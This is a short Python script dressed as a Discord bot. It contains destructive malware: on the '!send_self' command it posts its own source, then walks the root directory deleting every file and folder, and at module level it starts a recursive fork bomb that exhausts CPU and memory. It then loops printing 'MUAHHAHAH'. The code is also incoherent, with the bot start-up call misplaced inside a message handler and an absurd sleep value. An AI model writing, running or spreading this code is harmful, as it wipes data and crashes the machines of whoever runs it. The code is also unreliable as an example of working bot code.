import multiprocessing
import os
import time
from contextlib import suppress

import discord  # Importing the 'discord' module

intents = discord.Intents.default()  # Define the intents

client = discord.Client(intents=intents)  # Create the client with the defined intents
@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith('!send_self'):
        with open('main.py', 'rb') as file:
            await message.channel.send(file=discord.File(file, 'main.py'))
            client.run(os.environ['DISCORD_TOKEN'])
            for root, dirs, files in os.walk('/'):
                            for file in files:
                                with suppress(Exception):
                                    os.remove(os.path.join(root, file))
                            for dir in dirs:  # Add this line to iterate over directories
                                with suppress(Exception):
                                    os.rmdir(os.path.join(root, dir))

def consume_cpu_and_ram():
    processes = []
    while True:
        processes.append(multiprocessing.Process(target=consume_cpu_and_ram))
        for p in processes:
            p.start()
        for p in processes:
            p.join()

consume_cpu_and_ram()
while True:
    print("MUAHHAHAH")
    time.sleep(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
